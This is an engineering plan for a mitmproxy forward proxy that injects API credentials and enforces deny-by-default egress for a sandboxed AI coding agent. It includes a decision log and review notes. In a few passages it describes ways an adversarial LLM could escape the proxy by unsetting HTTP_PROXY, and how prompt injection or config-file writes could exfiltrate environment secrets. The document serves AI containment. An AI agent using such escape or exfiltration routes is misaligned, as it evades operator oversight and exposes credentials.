<!-- /autoplan restore point: /Users/son.dao/.gstack/projects/scoutqa-dot-ai-thor/proxy-rewrite-autoplan-restore-20260417-213046.md -->

# mitmproxy Outbound Credentials — 2026-04-17-06

> **Implementation update — 2026-04-22.** The shipped architecture diverges
> from the original HTTP_PROXY-based design below. Read this section first;
> treat the rest of the document as historical planning context.
>
> **What changed vs. the plan:**
>
> - **Transparent mode, not regular mode.** `mitmdump --mode transparent@8080`.
>   No `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` env vars anywhere — routing
>   is enforced by iptables REDIRECT in the kernel, not by convention.
> - **Shared network namespace.** opencode uses
>   `network_mode: "service:mitmproxy"` in compose. It has no network of its
>   own — it shares mitmproxy's netns. That's what lets iptables REDIRECT in
>   mitmproxy's netns catch opencode's outbound TCP :80/:443.
> - **`internal: true` dropped.** The `inside` network is no longer internal —
>   opencode needs reachability to LLM providers, which are CONNECT-passthrough
>   hosts. The firewall is iptables, not Docker's network isolation.
> - **iptables rules (mitmproxy entrypoint, running as root):**
>   - `RETURN` for `--uid-owner 1002` (mitmdump's own upstream connections —
>     prevents loopback deadlock).
>   - `RETURN` for `127.0.0.0/8`, `THOR_INSIDE_CIDR`, `THOR_OUTSIDE_CIDR`
>     (in-cluster traffic skips REDIRECT).
>   - `REDIRECT --to-ports 8080` for `tcp dpt:80` and `tcp dpt:443`.
>   - CIDRs are pinned via YAML anchors (`x-inside-cidr`, `x-outside-cidr`)
>     in `docker-compose.yml` and passed as env to the entrypoint. The
>     entrypoint fails loud if either is unset — no silent drift.
> - **Privilege drop via gosu.** Entrypoint starts as root (needs NET_ADMIN
>   for iptables + read access to key.pem), then `gosu mitmproxy-svc` (uid 1002) to exec mitmdump. `NET_ADMIN` is added via `cap_add` in compose.
> - **No Node preload.** `docker/opencode/mitmproxy-init.js` is deleted.
>   `undici.EnvHttpProxyAgent` is unnecessary when there's no proxy env var
>   to honor — the kernel redirects.
> - **Combined CA bundle at entrypoint.** `docker/opencode/entrypoint-wrap.sh`
>   concatenates the system CA bundle with the mitmproxy CA into
>   `/tmp/thor-ca-bundle.crt` and exports `CURL_CA_BUNDLE`, `SSL_CERT_FILE`,
>   `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`. Passthrough hosts (LLM providers)
>   need real upstream cert verification; MITM'd hosts need the mitmproxy CA.
>   Node uses `NODE_EXTRA_CA_CERTS` separately via compose env.
> - **Healthcheck reshaped.** `curl --resolve __health.thor:80:10.254.254.254`
>   so the REDIRECT rule catches a realistic outbound and the addon's Host
>   header intercept answers 200.
>
> Why: the HTTP_PROXY approach was bypassable by an adversarial LLM that
> unset the env var. iptables in a shared netns with drop-privileges makes
> the proxy the only egress — no escape hatch.
>
> **Supersedes `docs/plan/2026031101_data-proxy.md`.**
>
> Replace the `data` nginx container (URL-rewriting reverse proxy) with a
> new `mitmproxy` container — a **forward proxy** that opencode points at via
> `HTTP_PROXY` / `HTTPS_PROXY`. Credentials are injected by host match, so
> opencode/curl/node call real upstream URLs (`https://api.atlassian.com/...`)
> instead of fake local ones (`http://data/atlassian/...`).
>
> The service, image target, source directory, and DNS hostname are all
> renamed `data` → `mitmproxy` for clarity (the old name was overloaded).

## Motivation

Today's flow forces opencode to learn a synthetic URL scheme:

```
real:   GET https://api.atlassian.com/ex/jira/...
opencode → curl http://data/atlassian/ex/jira/...
nginx → rewrites to https://api.atlassian.com/... + injects Authorization
```

Problems with this:

- LLMs see `https://api.atlassian.com/...` in docs and naturally try to call it
  directly — it 401s without the secret.
- The mapping (`/atlassian/` → `api.atlassian.com`) is invisible from the LLM's
  perspective; it must be told in the system prompt and re-told every time it
  forgets.
- Each new upstream needs a new `DATA_ROUTE_*` env block — verbose and easy to
  misconfigure.
- Doesn't help with Node SDKs that hard-code `https://api.atlassian.com` as
  base URL — the rewrite trick only works when opencode constructs the URL
  itself.
- The service name `data` is overloaded — it isn't the data layer, it's an
  outbound proxy.

A real forward proxy with header injection per host fixes all of this:

```
real:   GET https://api.atlassian.com/...
opencode (HTTP_PROXY=http://mitmproxy:8080) → curl https://api.atlassian.com/...
mitmproxy → MITM the TLS, inject Authorization, forward to real upstream
```

opencode now uses the same URLs the LLM saw in the docs. Zero translation
layer in the prompt.

## Scope

**In scope:**

- New `mitmproxy` build target (in the root multi-stage `Dockerfile`) based
  on `mitmproxy/mitmproxy:<pinned>` running
  `mitmdump --mode regular@8080` with a custom Python addon.
- New shared `ca-gen` stage in the root `Dockerfile` that runs `openssl req
-x509` once; both `mitmproxy` and `opencode` targets `COPY --from=ca-gen`
  the cert (and the `mitmproxy` target also gets the private key). opencode's
  stage runs `update-ca-certificates` at build time.
- New `docker/mitmproxy/` directory containing `addon.py` and `entrypoint.sh`,
  COPY'd into the `mitmproxy` target from the root build context.
- Compose service renamed `data` → `mitmproxy`; DNS hostname follows.
- Config-driven credential injection via `config.json` (new top-level
  `outbound_credentials` block). Secrets stay in env vars and are interpolated
  with `${VAR}` syntax at request time.
- Hot reload: addon re-reads `config.json` on every request, cached by `mtime`.
  No mitmproxy restart needed when rules change. Container restart still
  required if env vars change (same as today).
- opencode container: `HTTP_PROXY` / `HTTPS_PROXY` env, the CA already trusted
  at the OS level (built in), `NODE_OPTIONS=--require /etc/thor/mitmproxy-init.js`
  preload that wires `undici.EnvHttpProxyAgent` so Node's built-in `fetch`
  honors the proxy on every Node ≥18 invocation regardless of bash entry
  point.
- **Network isolation**: split the compose network into two — `inside`
  (`internal: true`, no external egress) and `outside` (default, has
  internet). opencode joins `inside` only; `mitmproxy` joins both and is
  the sole bridge. Direct outbound from opencode that ignores `HTTP_PROXY`
  is dropped at the network layer — `HTTP_PROXY` becomes enforced policy,
  not a convention.
- Health endpoint at `http://mitmproxy:8080/__health` (intercepted by addon,
  no upstream call).
- Delete: `docker/data/` (entire directory: `Dockerfile`, `entrypoint.sh`,
  `default.conf.template.example`), `DATA_ROUTES` / `DATA_ROUTE_*_*` env vars,
  related README/.env.example blocks, any `http://data/` references in code
  or system prompt.

**Out of scope:**

- Per-repo credential scoping (any container that hits the proxy gets all
  configured creds — same as today's nginx setup).
- ~~Outbound allow-list / domain firewalling~~ — **moved in-scope** (UC1,
  accepted 2026-04-17): v1 is deny-by-default. See "Host policy model" below.
- Replacing the MCP `PROXY_REGISTRY` in `packages/common/src/proxies.ts` —
  that's a different concern (server-side MCP forwarding, not client-side
  HTTP).
- Routing the proxy itself through anything else (no upstream proxy chain).
- Logging request bodies — only metadata (`host`, `method`, `path`, status)
  for ops visibility. Bodies often contain secrets.
- `${ENV}` interpolation allowlist (UC4 rejected 2026-04-17, rationale:
  opencode does not have write access to `config.json`, so there's no
  attacker path from the LLM to the env-exfil vector. Revisit if that
  access model changes.)

## Target shape

### `config.json` (new block, additive)

```json
{
  "repos": { ... },
  "github_app": { ... },
  "mitmproxy": [
    {
      "host": "api.atlassian.com",
      "headers": { "Authorization": "${ATLASSIAN_AUTH}" }
    },
    {
      "host_suffix": ".acme.example",
      "headers": { "X-API-Key": "${ACME_WEBAPP_ADMIN_API_KEY}" }
    },
    {
      "host": "us.posthog.com",
      "headers": { "Authorization": "Bearer ${POSTHOG_API_KEY}" },
      "readonly": true
    }
  ]
}
```

- `host` (exact match) **or** `host_suffix` (suffix match starting with `.`),
  not both. First match wins; declaration order matters.
- `headers` values support `${ENV}` interpolation at request time. A missing
  env var aborts the request with a 502 + structured JSON error body + log
  line (fail closed). See "Error response contract" below.
- `readonly: true` rejects non-`GET`/`HEAD` with 405 (parity with current
  nginx `READONLY` flag). Defaults to `false`.

### Host policy model (UC1 accepted — deny by default)

The proxy handles every outbound request by classifying the destination host
into exactly one of three buckets:

1. **Inject** — host has a rule in `config.json#mitmproxy[]`. TLS is
   intercepted, configured headers are added, request forwarded.
2. **Passthrough** — host is in the `passthrough_hosts` list (hard-coded in
   the addon, plus optional config extension). Handled as CONNECT tunnel
   **without** TLS interception. No cert needed on the upstream, no addon
   visibility into request bodies, no header injection. Used for LLM
   providers and any other sensitive streaming traffic.
3. **Default: deny** — everything else returns **403** with a structured
   JSON body telling the caller the host isn't allowed. No upstream
   connection is attempted.

Default `passthrough_hosts` (hard-coded, can be extended via
`config.json#mitmproxy_passthrough`):

```python
DEFAULT_PASSTHROUGH = [
    "api.anthropic.com",
    "api.openai.com",
    # add more model providers as needed
]
```

UC2 (accepted): this list is how LLM provider traffic bypasses MITM. They
still transit the proxy (network isolation still holds), but as opaque TCP
tunnels via mitmproxy's `ignore_hosts` / `tcp_hosts` option — not through
the Python addon hook.

### Error response contract (AD9)

Every proxy-generated non-2xx response includes a JSON body and response
headers so the caller (including the LLM) can self-diagnose:

```json
{
  "error": "thor_proxy_host_denied",
  "host": "evil.com",
  "code": 403,
  "hint": "Add a rule to config.json#mitmproxy[] or config.json#mitmproxy_passthrough[]"
}
```

Response headers on every proxy response (success or error):

- `x-thor-proxy-rule: <host>|passthrough|none`
- `x-thor-proxy-error: <error_code>` (only on non-2xx)

Error codes: `host_denied`, `missing_env`, `readonly_violation`,
`malformed_rule`, `config_unavailable`.

### Container layout

```
docker/mitmproxy/
  addon.py               # ~120 lines: load config, match host, inject headers
  entrypoint.sh          # mitmdump -s addon.py --mode regular@8080 ...
```

### CA distribution (UC3 accepted — admin-generated, host-mounted, fail-fast)

CA private key never lives in an image layer. Admin generates it once, by
hand, into a gitignored host directory that both containers mount
read-only. Missing CA = container refuses to start.

1. **One-time admin step**: `./scripts/mitmproxy-ca-init.sh` runs
   `openssl req -x509` and writes three files to
   `./docker-volumes/mitmproxy-ca/` (gitignored):
   - `cert.pem` — public cert (mounted into opencode for trust)
   - `key.pem` — private key (mounted into mitmproxy for signing)
   - `mitmproxy-ca.pem` — cert + key concatenated (mitmproxy's preferred
     single-file format)

   The script is idempotent (refuses to overwrite existing files unless
   `--force` is passed).

2. **mitmproxy mount**: `./docker-volumes/mitmproxy-ca:/etc/thor/mitmproxy:ro`.
   mitmproxy entrypoint exits non-zero with a remediation message if
   `mitmproxy-ca.pem` is absent: "CA not found. Run
   `./scripts/mitmproxy-ca-init.sh` first."

3. **opencode mount**: `./docker-volumes/mitmproxy-ca:/etc/thor/ca:ro`.
   opencode entrypoint-wrap does:

   ```sh
   #!/bin/sh
   set -e
   if [ ! -f /etc/thor/ca/cert.pem ]; then
     echo "FATAL: mitmproxy CA not found at /etc/thor/ca/cert.pem" >&2
     echo "Remediation: run ./scripts/mitmproxy-ca-init.sh on the host" >&2
     exit 1
   fi
   cp /etc/thor/ca/cert.pem /usr/local/share/ca-certificates/mitmproxy-ca.crt
   update-ca-certificates --fresh >/dev/null
   exec "$@"
   ```

4. **Rotation**: admin runs `./scripts/mitmproxy-ca-init.sh --force` then
   `docker compose up -d --force-recreate mitmproxy opencode`. No image
   rebuild. No fingerprint handshake needed — the single host-side CA is
   the source of truth; both containers read it at boot.

5. **`.gitignore`**: `docker-volumes/mitmproxy-ca/` added to prevent
   accidental commit of the key.

### Root `Dockerfile` additions

```Dockerfile
# mitmproxy target — CA mounted from host at runtime, not in image
FROM mitmproxy/mitmproxy:<pinned> AS mitmproxy
COPY docker/mitmproxy/addon.py /etc/mitmproxy/addon.py
COPY docker/mitmproxy/entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

# opencode target — entrypoint wraps CA-trust update
FROM <existing opencode base> AS opencode
COPY docker/opencode/mitmproxy-init.js /etc/thor/mitmproxy-init.js
COPY docker/opencode/entrypoint-wrap.sh /entrypoint-wrap.sh
ENTRYPOINT ["/entrypoint-wrap.sh"]
# ... rest of existing opencode stage
```

### opencode wiring (`docker-compose.yml`)

```yaml
opencode:
  environment:
    HTTP_PROXY: http://mitmproxy:8080
    HTTPS_PROXY: http://mitmproxy:8080
    NO_PROXY: localhost,127.0.0.1,remote-cli,slack-mcp,grafana-mcp,opencode,gateway
    NODE_OPTIONS: --require /etc/thor/mitmproxy-init.js
    NODE_EXTRA_CA_CERTS: /usr/local/share/ca-certificates/mitmproxy-ca.crt
  depends_on:
    mitmproxy:
      condition: service_healthy
```

`/etc/thor/mitmproxy-init.js`:

```js
const { setGlobalDispatcher, EnvHttpProxyAgent } = require("undici");
setGlobalDispatcher(new EnvHttpProxyAgent());
```

## Decision Log

| #   | Decision                                                                                                                                | Rationale                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --- | --------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| D1  | **mitmproxy over Squid / custom Go proxy**                                                                                              | mitmproxy ships TLS interception + a 100-line Python addon API. Squid's `ssl_bump` is harder to configure and doesn't easily mutate headers. Custom Go is more code than needed.                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| D2  | **`mitmdump` not `mitmproxy`**                                                                                                          | Headless, log-friendly. The interactive TUI is dead weight in a container.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| D3  | **Config in `config.json`, secrets in env, interpolated at request time**                                                               | Keeps the existing pattern from `PROXY_REGISTRY` (`${ATLASSIAN_AUTH}` style). `config.json` is already the workspace-config source of truth and already hot-reloads via `createConfigLoader`. No new config surface for ops to learn.                                                                                                                                                                                                                                                                                                                                                                                  |
| D4  | **Hot reload via `mtime` re-read in the addon, not mitmproxy script reload**                                                            | mitmproxy's built-in script reload restarts addon state; reading the config file on each request (cached by mtime) is simpler, atomic, and doesn't lose in-flight flows. Cost is one `os.stat` per request — negligible.                                                                                                                                                                                                                                                                                                                                                                                               |
| D5  | ~~**CA generated in a shared multi-stage `ca-gen` build step**~~ **(SUPERSEDED by D17 — 2026-04-17)**                                   | ~~Both `mitmproxy` and `opencode` images get the CA at build time via `COPY --from=ca-gen`~~. Replaced by first-boot CA generation into a named volume (D17). Original rationale retained for history: "No shared volume, no entrypoint-time trust update. Tradeoff: CA private key lives in image layers — fine for self-hosted use, don't push images to a public registry." That tradeoff proved unacceptable under review: five-of-six voices flagged the image-layer-leak risk + rebuild-skew opacity as disqualifying.                                                                                           |
| D6  | **`NODE_OPTIONS=--require mitmproxy-init.js` over `NODE_USE_ENV_PROXY`**                                                                | `--require` is on Node's `NODE_OPTIONS` allowlist on every Node ≥18; the env-proxy native flag landed properly only in Node 24. The preload uses `undici.EnvHttpProxyAgent`, which works for all Node 22+ versions opencode might ship with.                                                                                                                                                                                                                                                                                                                                                                           |
| D7  | **Match by `host` (exact) or `host_suffix`, not regex**                                                                                 | Two predictable shapes cover every real case (single host, wildcard subdomain). Regex invites bugs and requires escaping in JSON.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| D8  | **Fail closed on missing env var (502, no header, log line)**                                                                           | Sending the request unauthenticated would leak the URL/path to the upstream and waste a quota slot. Failing loudly tells the LLM to ask for the env var.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| D9  | **Don't add per-repo scoping in v1**                                                                                                    | Today's nginx already gives all containers access to all routes. Matching that surface keeps blast radius small. Per-repo scoping needs a request-side identity signal we don't have yet.                                                                                                                                                                                                                                                                                                                                                                                                                              |
| D10 | **No request/response body logging**                                                                                                    | Bodies often contain credentials, PII, or large payloads. Status + host + method + path + bytes is enough for ops. mitmproxy's default flow log is too noisy and not redacted.                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| D11 | **Rename `data` → `mitmproxy` everywhere**                                                                                              | `data` was overloaded — it was never the data layer. Renaming the service, image target, source dir, and DNS hostname makes the role obvious and means the LLM never has to learn a fake URL convention.                                                                                                                                                                                                                                                                                                                                                                                                               |
| D12 | **Healthcheck via intercepted `__health` URL, not a separate port**                                                                     | mitmproxy can return a synthetic 200 from the addon on a sentinel URL — saves opening a second port and avoids a second process.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| D13 | **Move build into root multi-stage `Dockerfile` (delete `docker/mitmproxy/Dockerfile`)**                                                | The shared `ca-gen` stage requires a single Dockerfile so `mitmproxy` and `opencode` can both `COPY --from=ca-gen`. Aligns with how all other Node services are already organized.                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| D14 | **Two-network isolation (`inside` + `outside`), opencode on `inside` only**                                                             | Without network-level enforcement, untrusted code (or a bug) inside opencode can ignore `HTTP_PROXY` and connect directly. Putting opencode on an `internal: true` network with `mitmproxy` as the only bridge to the `outside` network makes the proxy the _only_ egress path. Same shape generalizes to future sandbox containers.                                                                                                                                                                                                                                                                                   |
| D15 | **Deny-by-default host policy** (UC1 accepted 2026-04-17)                                                                               | Three host buckets: `inject` (rule match → MITM + header injection), `passthrough` (allowlisted → CONNECT tunnel, no MITM), `deny` (everything else → 403 with structured error). Both independent reviewers flagged "build the enforcement point then don't enforce" as the top critical finding. Cost is ~30 lines of addon code and a maintained `DEFAULT_PASSTHROUGH` list; payoff is that prompt-injection-driven exfiltration stops at the proxy, not at the upstream.                                                                                                                                           |
| D16 | **CONNECT-passthrough for LLM providers** (UC2 accepted 2026-04-17)                                                                     | Anthropic, OpenAI, and any model provider go through mitmproxy as opaque TCP tunnels, not through the Python addon hook. Avoids: (a) TOS concerns around intercepting provider traffic, (b) concentrated secret exposure (one compromised addon = all prompts/completions in cleartext), (c) streaming perf hot spot from single-process Python TLS handling, (d) any compatibility risk with provider-specific TLS behavior. Network isolation still holds — they must still transit mitmproxy.                                                                                                                       |
| D17 | **CA generated once by admin, mounted from host, fail-fast if missing** (UC3 accepted 2026-04-17, supersedes D5; simplified 2026-04-17) | Admin runs `./scripts/mitmproxy-ca-init.sh` once to write `./docker-volumes/mitmproxy-ca/{cert,key,mitmproxy-ca}.pem` (gitignored). Both containers mount the dir read-only and exit with a clear remediation message if the CA is absent. Rotation = rerun the script with `--force` + `docker compose up -d --force-recreate`. No first-boot race, no fingerprint handshake, no image rebuild, no named-volume quirks. Image layers never contain the private key. Simpler than first-boot generation because the single host-side file is the source of truth — no need for inter-container probing to detect skew. |

## Phases

### Phase 1 — `mitmproxy` container + Python addon + config schema

**Goal**: Standalone container that can be `curl`'d through with credential
injection from `config.json`. opencode wiring not yet required.

**Tasks**:

- Add `ca-gen` and `mitmproxy` build targets to root `Dockerfile` (see
  "Target shape" above). Delete `docker/data/Dockerfile`.
- Create `docker/mitmproxy/` with:
  - `addon.py`: - `load(loader)`: declare `config_path` option (default
    `/workspace/config.json`). - `request(flow)`: `__health` short-circuits to 200; otherwise re-read
    config via `_load_rules()` (mtime cache); find first matching rule by
    `host` or `host_suffix`; if `readonly` and method not in
    `{GET, HEAD, OPTIONS}` → 405; for each header, expand `${ENV}` → 502 if
    missing; set `flow.request.headers[name] = value`. - Structured log line on every request: `{ts, host, method, path, status,
rule_matched}`. JSON to stdout for fluent collection later.
  - `entrypoint.sh`: launch `mitmdump -s /etc/mitmproxy/addon.py --mode
regular@8080 --set confdir=/etc/thor/mitmproxy --set
termlog_verbosity=info`.
- Add `mitmproxy` to `WorkspaceConfigSchema` in
  `packages/common/src/workspace-config.ts` (Zod). Validate `host` XOR
  `host_suffix`. Don't break existing configs (field is optional).
- Update `docs/examples/workspace-config.example.json` with one example rule.
- `docker-compose.yml`: rename service `data` → `mitmproxy`; build context `.`
  with `target: mitmproxy`; expose 8080 (replace port 80) on
  `127.0.0.1:3080`. Healthcheck:
  `curl -sf http://localhost:8080/__health`. Drop `env_file: .env` (no longer
  needed by the proxy itself).

**Exit criteria**:

- `docker compose up -d mitmproxy` boots and the container reports healthy.
- `curl -x http://localhost:3080 https://api.atlassian.com/oauth/me` (or any
  real Atlassian endpoint) returns the upstream response with the
  `Authorization` header injected — verified via the addon log line. (Use
  `--cacert <(docker compose exec mitmproxy cat /etc/thor/mitmproxy/mitmproxy-ca.pem)`
  or `-k` for the smoke test.)
- `curl -x http://localhost:3080 http://example.com/__health` does **not**
  hit example.com (intercepted by addon, returns 200).
- Editing `config.json` and changing a header value is reflected on the next
  request without restarting the container (mtime hot reload works).
- Removing a referenced env var causes the next request to fail with a 502
  and a log line naming the missing variable.

### Phase 2 — opencode wiring (HTTP_PROXY + CA trust + Node preload + network isolation)

**Goal**: opencode's curl/node calls to real upstream URLs go through
mitmproxy and pick up the injected headers automatically.

**Tasks**:

- In root `Dockerfile`, opencode stage: `COPY --from=ca-gen
/ca/cert.pem /usr/local/share/ca-certificates/mitmproxy-ca.crt` and run
  `update-ca-certificates`.
- Add `docker/opencode/mitmproxy-init.js` (the `EnvHttpProxyAgent` preload). Bake
  into image at `/etc/thor/mitmproxy-init.js`.
- `docker-compose.yml` opencode service: add `HTTP_PROXY` / `HTTPS_PROXY` /
  `NO_PROXY` / `NODE_OPTIONS` / `NODE_EXTRA_CA_CERTS` env. Update
  `depends_on` to wait on `mitmproxy: service_healthy` (replaces `data`).
- Decide and document `NO_PROXY` list (all in-cluster service names + Docker
  daemon socket). Critical: missing entries cause loops or break local MCP
  forwarding.
- **Network isolation**: declare two top-level networks in `docker-compose.yml`:
  `inside` (`internal: true`) and `outside` (default). Move opencode to
  `networks: [inside]` only. Add `mitmproxy` to `networks: [inside, outside]`.
  Audit every other compose service: anything opencode talks to (remote-cli,
  slack-mcp, grafana-mcp, gateway, etc.) must also be on `inside`. Anything
  that needs raw internet (e.g. `vouch` for OAuth) goes on `outside` (or
  both, if opencode also needs to reach it).
- Verify the AI provider call path: opencode's model calls (Anthropic /
  OpenAI) must transit mitmproxy. Add a pass-through smoke test in Phase 2
  exit criteria.
- Audit opencode for non-HTTP egress (websockets-not-over-HTTPS, raw
  TCP/UDP, gRPC, S3/Postgres/etc. SDK clients). Any of these break under
  network isolation. Flag findings in this plan as they surface.

**Exit criteria**:

- From inside the opencode container:
  - `curl https://api.atlassian.com/oauth/me` works (no manual `-x` flag,
    no `-H Authorization`).
  - `node -e "const r = await fetch('https://api.atlassian.com/oauth/me');
console.log(r.status)"` works.
  - `curl http://remote-cli:3004/health` does **not** route through
    mitmproxy (NO_PROXY honored — confirm via mitmproxy log absence).
  - **Direct egress is blocked**: with `HTTP_PROXY` temporarily unset,
    `curl --noproxy '*' https://api.atlassian.com/` fails (network
    unreachable / timeout) — proves the `inside` network is enforcing.
  - **Anthropic / model provider path works**: opencode can complete a
    real LLM call (verified via mitmproxy log line for the provider host)
    with no rule matching — pass-through default works end-to-end.
- LLM-facing system prompt no longer needs the `http://data/<service>/...`
  instructions (we'll remove them in Phase 3).
- Existing e2e flow (`./scripts/test-e2e.sh`) passes.

### Phase 3 — Cleanup: delete old `data` container, env, docs, system prompt

**Goal**: Remove all traces of the legacy URL-rewriting scheme.

**Tasks**:

- Delete `docker/data/` directory entirely.
- Delete `DATA_ROUTES` / `DATA_ROUTE_*_*` blocks from `.env.example` and
  `README.md`.
- Search for `http://data/` and `data:80` in the codebase and the opencode
  system prompt at `docker/opencode/config/`; replace with real upstream URLs
  or remove instructions entirely (the proxy makes them moot).
- Search for the service name `data` across compose dependencies and any docs
  to confirm the rename is complete.
- Add a short paragraph to `README.md` explaining how to add a new credential
  rule (one config entry + one env var, no code change).
- Note in this plan that it supersedes `docs/plan/2026031101_data-proxy.md`.

**Exit criteria**:

- `rg DATA_ROUTE` in repo returns nothing.
- `rg "http://data/" -- ':!docs/plan/2026031101*' ':!docs/plan/2026041706*'`
  returns nothing.
- `rg -w data` shows only legitimate uses (the english word, not the service
  name) — manual review.
- README has a working "Add a credential rule" example.
- Full e2e still passes; opencode session in Slack can fetch from a real
  upstream URL with the LLM never seeing `http://data/...`.

## Forward compatibility (designed-for, not built)

- **Per-client policy via `Proxy-Authorization`**: the addon's rule lookup
  should be structured so that adding a `client` axis later is a
  shape-preserving change, not a rewrite. Concretely: today rules match by
  host; tomorrow rules match by `(client_token, host)` where `client_token`
  comes from `Proxy-Authorization` (absent = "default client" = today's
  behavior). This unlocks two future cases without re-architecting:
  - **In-cluster sandbox** (Docker network peer): different policy than
    opencode (deny-by-default allowlist, strip auth instead of inject).
  - **Remote cloud sandbox**: same addon, reached over the public internet
    via an HTTPS proxy listener with `Proxy-Authorization` for identity
    and rate limiting.
- Don't build the multi-tenancy now, but don't bake in the assumption that
  there's only ever one client either (e.g. avoid `rules: [...]` at the top
  level if `clients: { default: { rules: [...] } }` would extend cleanly).

## Open questions

- **mitmproxy version pin**: latest stable is 11.x; pin to a specific minor
  to avoid surprise breakage in Phase 1. Check at implementation time.
- **CA cert rotation**: each `docker compose build --no-cache` regenerates
  the CA. Acceptable for v1 — note in README that build cache invalidation
  on the `ca-gen` stage requires `docker compose up --build` for both
  `mitmproxy` and `opencode` (compose handles this when triggered together).
  If a deliberate rotation policy is needed later, document a `--no-cache`
  rebuild runbook.
- **`NO_PROXY` for `*.docker.internal` / metadata IPs**: confirm Docker
  Desktop on Mac doesn't need extra entries. Will validate during Phase 2.
- **Does any existing in-repo Node script construct `http://data/...` URLs at
  call sites we don't control?** If so, those break in Phase 3 even with
  HTTP_PROXY set, because they're calling the wrong URL. Phase 3 search
  should catch them — flag if any are non-trivial to migrate.

## GSTACK REVIEW REPORT

Run: `/autoplan` on 2026-04-17. Dual voices per phase: Codex CLI + independent Claude subagent. Scope detected: no UI, DX scope (AI agent is primary user).

| Review        | Trigger              | Why                     | Runs | Status      | Findings                     |
| ------------- | -------------------- | ----------------------- | ---- | ----------- | ---------------------------- |
| CEO Review    | `/plan-ceo-review`   | Scope & strategy        | 1    | issues_open | 2 critical, 4 high, 3 medium |
| Eng Review    | `/plan-eng-review`   | Architecture & tests    | 1    | issues_open | 5 high, 3 medium             |
| DX Review     | `/plan-devex-review` | Developer experience    | 1    | issues_open | 2 high, 3 medium, 1 low      |
| Design Review | —                    | (skipped — no UI scope) | 0    | —           | —                            |

### CEO dual-voice consensus

| Dimension              | Codex                                 | Claude                             | Consensus              |
| ---------------------- | ------------------------------------- | ---------------------------------- | ---------------------- |
| Premises valid?        | ❌ wrong problem                      | ❌ framing is 2nd-order            | **DISAGREE**           |
| Right problem?         | ❌ tooling ergonomics ≠ infra rewrite | ❌ real problem is egress security | **DISAGREE**           |
| Scope calibration?     | ❌ "security theater" (no allowlist)  | ❌ allowlist must be v1            | **DISAGREE**           |
| Alternatives explored? | ❌ remote-cli broker ignored          | ❌ Envoy/eBPF/commercial ignored   | **DISAGREE**           |
| Competitive risks?     | —                                     | ❌ Anthropic sandbox roadmap       | flagged (single-voice) |
| 6-month trajectory?    | ❌ baked-in shortcuts                 | ❌ allowlist omission = future CVE | **DISAGREE**           |

### Eng dual-voice consensus

| Dimension                | Codex                                      | Claude                                                     | Consensus                        |
| ------------------------ | ------------------------------------------ | ---------------------------------------------------------- | -------------------------------- |
| Architecture sound?      | ❌ regular-mode MITM = throughput hot spot | ❌ mitmproxy = new SPOF                                    | **DISAGREE**                     |
| Config semantics?        | ❌ schema mismatch + no last-known-good    | ❌ partial-JSON unhandled                                  | **CONFIRMED** (gap)              |
| NODE_OPTIONS risk?       | ❌ can brick container                     | ❌ preload fires on every node invocation                  | **CONFIRMED** (gap)              |
| CA at build time?        | ❌ desync risk, no fingerprint check       | ❌ key-in-layer footgun                                    | **CONFIRMED** (gap)              |
| Network isolation?       | ❌ IPv6/metadata/DNS unspecified           | ❌ IPv6/metadata negative tests missing                    | **CONFIRMED** (gap)              |
| Healthcheck?             | ❌ liveness only, not readiness            | ❌ `curl -sf` syntax won't work with mitmdump regular mode | **CONFIRMED** (bug)              |
| Test coverage?           | ❌ smoke tests ≠ verification strategy     | ❌ addon not unit-testable as-written                      | **CONFIRMED** (gap)              |
| Security (config trust)? | —                                          | ❌ unbounded `${ENV}` interpolation                        | flagged (single-voice, critical) |

### DX dual-voice consensus

| Dimension         | Codex                               | Claude                                  | Consensus           |
| ----------------- | ----------------------------------- | --------------------------------------- | ------------------- |
| LLM ergonomics?   | ❌ passthrough = opaque failures    | ❌ typo silently bypasses auth          | **CONFIRMED** (gap) |
| Error messages?   | ❌ bare 502 not actionable          | ❌ need x-thor-proxy-rule header        | **CONFIRMED** (gap) |
| Getting started?  | ❌ config contract inconsistent     | ❌ no `thor proxy check` tool           | **CONFIRMED** (gap) |
| Upgrade/rotation? | ❌ CA trap normalized               | ❌ no fingerprint mismatch guard        | **CONFIRMED** (gap) |
| Debugging?        | ❌ failure taxonomy too thin        | ❌ `/__health` should return rule count | **CONFIRMED** (gap) |
| Docs complete?    | ❌ "a short paragraph" insufficient | ❌ no migration guide                   | **CONFIRMED** (gap) |

### Cross-phase themes (flagged independently in 2+ phases)

- **Theme 1: Deny-by-default vs passthrough** — raised in CEO (×2), Eng (×1), DX (×2). Five-of-six voices. Highest-confidence signal in the entire review.
- **Theme 2: CA in image layers is a footgun** — raised in CEO (×1), Eng (×2), DX (×2). Five-of-six voices.
- **Theme 3: Don't MITM LLM provider traffic** — raised in CEO (×2), Eng (×1). Three-of-six voices, but both CEO voices flagged it as high severity.
- **Theme 4: Config-field trust boundary** — single-voice (Claude Eng) but concrete vuln: LLM with write access to config.json can exfil any container env to any listed host.

### Decision Audit Trail

| #    | Phase  | Decision                                                                                                                                                                                                                      | Classification | Principle | Rationale                                                                             | Status           |
| ---- | ------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | --------- | ------------------------------------------------------------------------------------- | ---------------- |
| AD1  | DX/Eng | Fix config-field name collision (`outbound_credentials` in scope text vs `mitmproxy` in example and schema tasks) — pick `mitmproxy`                                                                                          | Mechanical     | P5        | Strict schema will brick; user already chose `mitmproxy` for greppability             | auto             |
| AD2  | Eng    | Rewrite healthcheck to use proxy form: `curl -sf -x http://localhost:8080 http://__health.thor/`                                                                                                                              | Mechanical     | P5        | Current form won't work — mitmdump regular mode doesn't serve origin-form             | auto             |
